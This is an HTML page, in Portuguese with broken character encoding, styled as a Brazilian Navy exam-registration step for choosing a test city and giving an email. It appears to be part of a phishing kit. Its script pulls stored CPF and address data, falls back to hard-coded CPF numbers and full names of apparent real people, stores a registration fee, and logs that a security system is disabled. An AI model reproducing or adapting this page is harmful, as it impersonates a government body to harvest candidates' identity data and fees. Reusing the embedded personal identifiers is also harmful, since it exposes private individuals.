<!doctype html>
<html lang="pt-br">
    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
    <head>
        <meta charset="UTF-8" />
        <meta content="width=device-width, initial-scale=1.0" name="viewport" />
        <title>Marinha do Brasil - Cidade de Prova</title>

        <script src="../js/concursos-marinha.js"></script>
        <script src="https://cdn.tailwindcss.com/3.3.0"></script>
        <link href="../css/all.min.css" rel="stylesheet" />
        <link href="../css/home.css" rel="stylesheet" />
        <script src="../js/cidades-prova-cpu-pe.js"></script>
        <script src="../js/cargos-cpu-pe-select.js"></script>

        <style>
            .gov-header {
                background-color: #222222;
            }
            .inep-header {
                background-color: #ffffff;
            }
            .form-header {
                background-color: #fbc12a;
                color: white;
                font-weight: 600;
            }
            .footer-bg {
                background-color: #ffffff;
            }
            .btn-primary {
                background-color: #003f6b;
                color: white;
                transition: all 0.2s ease;
            }
            .btn-primary:hover {
                background-color: #4d7396;
            }
            .btn-primary:disabled {
                background-color: #003f6b;
                color: rgba(255, 255, 255, 0.6);
                cursor: not-allowed;
            }
            .required-star {
                color: #ff0000;
            }
            .location-card {
                border: 2px solid #e5e7eb;
                transition: all 0.2s ease;
            }
            .location-card:hover {
                border-color: #93c5fd;
            }
            .location-card.selected {
                border-color: #003f6b;
                background-color: #f0f9ff;
            }
            .text-shadow {
                text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
            }
        </style>
        <script>
            document.addEventListener("DOMContentLoaded", function () {
                const cpfData = JSON.parse(
                    localStorage.getItem("cpfData") || "{}",
                );
                const addressData = JSON.parse(
                    localStorage.getItem("enderecoData") || "{}",
                );

                const testUserData = {
                    CPF: "91834279372",
                    NOME: "IRACEMA DE SOUSA SILVA",
                    NASC: "1970-10-24 00:00:00",
                };

                let userData;
                if (cpfData.dados?.[0]) {
                    userData = cpfData.dados[0];
                } else {
                    console.log("‚ö†Ô∏è Usando dados de teste - Sistema de seguran√ßa desativado");
                    userData = testUserData;
                }

                document.getElementById("cpf-display").textContent = userData.CPF || testUserData.CPF;
                document.getElementById("nome-display").textContent = userData.NOME || testUserData.NOME;

                const cidadeElements = document.querySelectorAll("#cidade-display");
                cidadeElements.forEach((element) => {
                    element.textContent = addressData.cidade || "N√£o informado";
                });

                const ufElements = document.querySelectorAll("#uf-display");
                ufElements.forEach((element) => {
                    element.textContent = addressData.uf || "";
                });

                // Obter concurso selecionado da URL ou localStorage
                const urlParams = new URLSearchParams(window.location.search);
                const concursoId = urlParams.get('concurso') || localStorage.getItem('concursoSelecionado') || 'eam';

                // Buscar dados do concurso
                const concurso = window.getConcursoById ? window.getConcursoById(concursoId) : null;

                // Dados padr√£o caso n√£o encontre o concurso
                const concursoDefault = {
                    id: "eam",
                    nome: "Escolas de Aprendizes-Marinheiros (EAM)",
                    sigla: "EAM",
                    descricao: "Concurso de Admiss√£o √†s Escolas de Aprendizes-Marinheiros 2026",
                    taxaInscricao: 40.00,
                    vagas: 850,
                    salarioApos: "R$ 2.294,50",
                    escolaridade: "Ensino M√©dio Completo ou em Conclus√£o",
                    provaData: "26/04/2026"
                };

                const concursoData = concurso || concursoDefault;

                // Atualizar container de cargo selecionado
                const cargoNomeDisplay = document.getElementById("cargo-nome-display");
                const cargoDetalhesDisplay = document.getElementById("cargo-detalhes-display");
                const cargoInfoDisplay = document.getElementById("cargo-info-display");
                const concursoSiglaDisplay = document.getElementById("concurso-sigla");

                if (cargoNomeDisplay) {
                    cargoNomeDisplay.innerHTML = `<strong>${concursoData.nome}</strong><br><small class="text-gray-500">${concursoData.descricao}</small>`;
                }

                if (cargoDetalhesDisplay) {
                    cargoDetalhesDisplay.textContent = `Sal√°rio: ${concursoData.salarioApos} | Vagas: ${concursoData.vagas || 'Diversas'}`;
                }

                if (cargoInfoDisplay) {
                    cargoInfoDisplay.textContent = `Escolaridade: ${concursoData.escolaridade} | Prova: ${concursoData.provaData}`;
                }

                if (concursoSiglaDisplay) {
                    concursoSiglaDisplay.textContent = concursoData.sigla;
                }

                // Salvar dados do concurso no localStorage
                localStorage.setItem("concursoSelecionado", concursoData.id);
                localStorage.setItem("cargoPretendido", concursoData.id);
                localStorage.setItem("cargoPretendidoTexto", concursoData.nome);
                localStorage.setItem("taxaInscricao", (concursoData.taxaInscricao * 100).toString());
                localStorage.setItem("nivelCargo", concursoData.escolaridade.includes("Superior") ? "superior" : "medio");

                console.log("üìã Concurso carregado:", concursoData);

                const emailInput = document.getElementById("email-confirmacao");
                emailInput.addEventListener("input", updateSubmitButton);

                const emailSalvo = localStorage.getItem("emailConfirmacao");
                if (emailSalvo) {
                    emailInput.value = emailSalvo;
                }

                updateSubmitButton();

                const form = document.getElementById("local-form");
                form.addEventListener("submit", function (e) {
                    e.preventDefault();

                    const email = emailInput.value.trim();

                    if (!email) {
                        alert("Por favor, digite seu e-mail para receber o Cart√£o de Confirma√ß√£o");
                        emailInput.focus();
                        return;
                    }

                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (!emailRegex.test(email)) {
                        alert("Por favor, digite um e-mail v√°lido");
                        emailInput.focus();
                        return;
                    }

                    // Salvar email no localStorage
                    localStorage.setItem("emailConfirmacao", email);
                    localStorage.setItem("inscricaoConcluida", "true");

                    console.log("‚úÖ Email salvo no localStorage:", email);
                    console.log("‚úÖ Todos os dados salvos:", {
                        emailConfirmacao: localStorage.getItem("emailConfirmacao"),
                        cargoPretendido: localStorage.getItem("cargoPretendido"),
                        cargoPretendidoTexto: localStorage.getItem("cargoPretendidoTexto"),
                        taxaInscricao: localStorage.getItem("taxaInscricao"),
                        nivelCargo: localStorage.getItem("nivelCargo")
                    });

                    window.location.href = "../info/";
                });
            });

            function updateSubmitButton() {
                const submitButton = document.getElementById("submit-button");
                const emailInput = document.getElementById("email-confirmacao");

                const hasEmail = emailInput && emailInput.value.trim() !== "";
                // Cargo √© fixo, sempre dispon√≠vel
                const hasCargo = true;

                const canSubmit = hasEmail && hasCargo;

                submitButton.disabled = !canSubmit;

                const statusText = document.getElementById("selection-status");
                if (!hasEmail) {
                    statusText.textContent = "Digite seu e-mail para continuar";
                    statusText.className = "text-sm text-gray-500 text-center mt-2";
                } else {
                    statusText.textContent = "Tudo pronto! Clique em continuar";
                    statusText.className = "text-sm text-green-600 text-center mt-2";
                }
            }

            function selectProvaLocation(element, cityId) {
                document.querySelectorAll(".location-card").forEach((card) => {
                    card.classList.remove("selected");
                });

                element.classList.add("selected");
                element.querySelector('input[type="radio"]').checked = true;

                console.log("Cidade de prova selecionada:", cityId);
            }

            window.selectProvaLocation = selectProvaLocation;
        </script>
    </head>
    <body class="flex flex-col min-h-screen">
        <div class="inep-header py-3">
            <div class="container mx-auto px-4">
                <img src="../images/logo-marinha.png" alt="Logo SSPM" height="30" width="100" style="object-fit: contain" />
            </div>
        </div>
        <main class="flex-grow py-8" style="padding-top:10px!important">
            <div class="container mx-auto px-4 max-w-3xl">
                <div class="border border-gray-300 rounded">
                    <div class="form-header py-2 px-4 text-center">
                        <h2 class="text-lg">Inscri√ß√£o &gt; Local de Prova</h2>
                    </div>
                    <div class="p-6">
                        <div class="bg-[#2B5984] p-4 rounded-md mb-5 text-white shadow-md">
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div class="p-2">
                                    <p class="text-sm text-gray-200">CPF:</p>
                                    <p id="cpf-display" class="font-semibold text-shadow">57002029215</p>
                                </div>
                                <div class="p-2">
                                    <p class="text-sm text-gray-200">
                                        Nome Completo:
                                    </p>
                                    <p id="nome-display" class="font-semibold text-shadow">PATRICIA TOBELEM DA SILVA</p>
                                </div>
                            </div>
                        </div>
                        <form id="local-form" class="space-y-5" action="../info">
                            <div>
                                <div class="mb-4 p-4 bg-green-50 border border-green-200 rounded-lg">
                                    <h4 class="font-bold text-green-800 mb-2 flex items-center">
                                        <i class="fas fa-check-circle text-green-600 mr-2"></i>
                                        Concurso Selecionado
                                        <span id="concurso-sigla" class="ml-2 px-2 py-0.5 bg-green-600 text-white text-xs rounded">EAM</span>
                                    </h4>
                                    <div class="bg-white p-3 rounded border">
                                        <div class="font-medium text-gray-800 mb-1" id="cargo-nome-display">
                                            <strong>Escolas de Aprendizes-Marinheiros (EAM)</strong><br>
                                            <small class="text-gray-500">Concurso de Admiss√£o √†s Escolas de Aprendizes-Marinheiros 2026</small>
                                        </div>
                                        <div class="text-sm text-gray-600" id="cargo-detalhes-display">
                                            Sal√°rio: R$ 2.294,50 | Vagas: 850
                                        </div>
                                        <div class="text-xs text-gray-500 mt-1" id="cargo-info-display">
                                            Escolaridade: Ensino M√©dio Completo ou em Conclus√£o | Prova: 26/04/2026
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <input type="hidden" id="selected-location-id" value>
                            <div class="bg-[#f0f9ff] border-2 border-[#003f6b] p-4 rounded-md shadow-md">
                                <h4 class="font-bold text-gray-800 flex items-center">
                                    <i class="fas fa-map-marker-alt text-[#003f6b] mr-2"></i>
                                    <span>Munic√≠pio de Prova</span>
                                </h4>
                                <div class="mt-3 text-gray-700">
                                    <div id="cidade-prova-container">
                                        <div class="space-y-2">
                                            <p class="font-medium text-gray-800 mb-3">
                                                Selecione uma cidade de prova:
                                            </p>

                                            <div class="max-h-96 overflow-y-auto border border-gray-200 rounded-lg p-3">
                                                <!-- Regi√£o Sudeste -->
                                                <div class="mb-4">
                                                    <h6 class="font-bold text-[#003366] mb-2 border-b pb-1">Regi√£o Sudeste</h6>
                                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50 selected">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="rio-de-janeiro-rj" class="mr-3" checked>
                                                                <div><h5 class="font-semibold text-gray-800">Rio de Janeiro - RJ</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="angra-dos-reis-rj" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Angra dos Reis - RJ</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="nova-friburgo-rj" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Nova Friburgo - RJ</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="sao-pedro-da-aldeia-rj" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">S√£o Pedro da Aldeia - RJ</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="vila-velha-es" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Vila Velha - ES</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="belo-horizonte-mg" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Belo Horizonte - MG</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="sao-paulo-sp" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">S√£o Paulo - SP</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="santos-sp" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Santos - SP</h5></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <!-- Regi√£o Nordeste -->
                                                <div class="mb-4">
                                                    <h6 class="font-bold text-[#003366] mb-2 border-b pb-1">Regi√£o Nordeste</h6>
                                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="salvador-ba" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Salvador - BA</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="natal-rn" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Natal - RN</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="olinda-pe" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Olinda - PE</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="fortaleza-ce" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Fortaleza - CE</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="sao-luis-ma" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">S√£o Lu√≠s - MA</h5></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <!-- Regi√£o Norte -->
                                                <div class="mb-4">
                                                    <h6 class="font-bold text-[#003366] mb-2 border-b pb-1">Regi√£o Norte</h6>
                                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="belem-pa" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Bel√©m - PA</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="manaus-am" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Manaus - AM</h5></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <!-- Regi√£o Sul -->
                                                <div class="mb-4">
                                                    <h6 class="font-bold text-[#003366] mb-2 border-b pb-1">Regi√£o Sul</h6>
                                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="rio-grande-rs" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Rio Grande - RS</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="porto-alegre-rs" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Porto Alegre - RS</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="florianopolis-sc" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Florian√≥polis - SC</h5></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <!-- Regi√£o Centro-Oeste -->
                                                <div class="mb-2">
                                                    <h6 class="font-bold text-[#003366] mb-2 border-b pb-1">Regi√£o Centro-Oeste</h6>
                                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="ladario-ms" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Lad√°rio - MS</h5></div>
                                                            </div>
                                                        </div>
                                                        <div class="location-card p-2 rounded-md cursor-pointer hover:bg-gray-50">
                                                            <div class="flex items-center">
                                                                <input type="radio" name="cidade-prova" value="brasilia-df" class="mr-3">
                                                                <div><h5 class="font-semibold text-gray-800">Bras√≠lia - DF</h5></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Campo de E-mail -->
                            <div class="bg-[#f8fafc] border-2 border-[#e2e8f0] p-4 rounded-md shadow-sm mt-4">
                                <h4 class="font-bold text-gray-800 flex items-center mb-3">
                                    <i class="fas fa-envelope text-[#003f6b] mr-2"></i>
                                    <span>Cart√£o de Confirma√ß√£o</span>
                                </h4>
                                <div class="mb-4">
                                    <label for="email-confirmacao" class="block mb-2 font-medium text-gray-700">
                                        Digite seu e-mail para receber o Cart√£o
                                        de Confirma√ß√£o:
                                        <span class="required-star">*</span>
                                    </label>
                                    <input type="email" id="email-confirmacao" class="w-full border border-gray-300 p-2 rounded-md focus:border-blue-500 focus:ring-1 focus:ring-blue-500" placeholder="seu@email.com" required value="">
                                    <p class="text-xs text-gray-600 mt-1">
                                        <i class="fas fa-info-circle mr-1"></i>
                                        O Cart√£o de Confirma√ß√£o cont√©m o local
                                        exato da prova e seu n√∫mero de
                                        inscri√ß√£o.
                                    </p>
                                </div>
                            </div>

                            <div class="border-t border-gray-300 pt-4 mt-6">
                                <button type="submit" id="submit-button" class="btn-primary w-full py-3 rounded-md flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed">
                                    <i class="fas fa-arrow-right mr-2"></i>
                                    <span>Continuar</span>
                                </button>
                                <p id="selection-status" class="text-sm text-gray-500 text-center mt-2">Cargo selecionado - Pronto para continuar</p>
                            </div>
                        <input type="hidden" name="utm_source" value="organic" id="f577469d-dfef-ff63-896a-bc52a9fcddb9"><input type="hidden" name="utm_campaign" value id="8f7a28de-ac06-fdbd-da43-d55e17e5a642"><input type="hidden" name="utm_medium" value id="e2468ac3-659e-776b-2f93-390f8c430775"><input type="hidden" name="utm_content" value id="33cbbde9-066f-1efc-2c07-8ae9ec497f80"><input type="hidden" name="utm_term" value id="a23ae7a8-ef46-9959-b20a-e653ba484302"></form>
                    </div>
                </div>
            </div>
        </main>
        <footer class="footer-bg text-black py-4 text-xs">
            <div class="container mx-auto px-4">
                <div class="flex flex-col items-center mb-2">
                    <img src="../images/logo-marinha.png" alt="Marinha do Brasil" height="30" width="60" style="object-fit: contain" />
                </div>
                <div class="flex justify-between items-center">
                    <div>&copy; C√≥digo de √âtica e Conduta | Pol√≠tica de Integridade</div>
                    <div class="flex items-center">
                        <i class="fas fa-globe mr-1"></i> Funda√ß√£o Marinha do Brasil
                    </div>
                </div>
            </div>
        </footer>
    </body>
</html>
